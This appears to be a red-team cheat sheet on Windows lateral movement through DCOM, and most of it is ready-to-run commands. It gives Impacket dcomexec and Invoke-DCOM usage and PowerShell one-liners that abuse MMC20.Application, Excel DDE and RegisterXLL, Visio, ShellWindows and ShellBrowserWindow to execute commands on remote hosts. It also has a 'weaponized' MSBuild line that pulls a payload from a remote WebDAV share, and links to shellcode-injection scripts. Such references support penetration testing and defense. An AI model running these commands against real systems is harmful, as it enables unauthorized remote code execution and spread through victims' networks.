# Internal - DCOM

> DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.


* Impacket DCOMExec.py
  ```ps1
  dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]
  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'

  python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\$@$HOST 'notepad.exe'
  # -object MMC20 specifies that we wish to instantiate the MMC20.Application object.
  # -silentcommand executes the command without attempting to retrieve the output.
  ```
* CheeseTools - https://github.com/klezVirus/CheeseTools
  ```powershell
  # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
  -t, --target=VALUE         Target Machine
  -b, --binary=VALUE         Binary: powershell.exe
  -a, --args=VALUE           Arguments: -enc <blah>
  -m, --method=VALUE         Methods: MMC20Application, ShellWindows,
                              ShellBrowserWindow, ExcelDDE, VisioAddonEx,
                              OutlookShellEx, ExcelXLL, VisioExecLine, 
                              OfficeMacro
  -r, --reg, --registry      Enable registry manipulation
  -h, -?, --help             Show Help

  Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.
  ```
* Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1
  ```powershell
  Import-Module .\Invoke-DCOM.ps1
  Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart "MyService"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
  ```


## DCOM via MMC Application Class 

This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named **"ExecuteShellCommand"** under **Document.ActiveView**.

```ps1
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")

# Weaponized example with MSBuild
PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
```

Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1


## DCOM via Office

* Excel.Application
  * DDEInitiate
  * RegisterXLL
* Outlook.Application
  * CreateObject->Shell.Application->ShellExecute
  * CreateObject->ScriptControl (office-32bit only)
* Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
  * Addons
  * ExecuteLine
* Word.Application
  * RunAutoMacro


```ps1
# Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM
Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a

# Using Excel DDE
PS C:\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS C:\> $excel.DisplayAlerts = $false
PS C:\> $excel.DDEInitiate("cmd", "/c calc.exe")

# Using Excel RegisterXLL
# Can't be used reliably with a remote target
Require: reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS> $excel.RegisterXLL("EvilXLL.dll")

# Using Visio
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$ComputerName"))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")
```


## DCOM via ShellExecute

```ps1
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```


## DCOM via ShellBrowserWindow

:warning: Windows 10 only, the object doesn't exists in Windows 7

```ps1
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```


## References

* [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)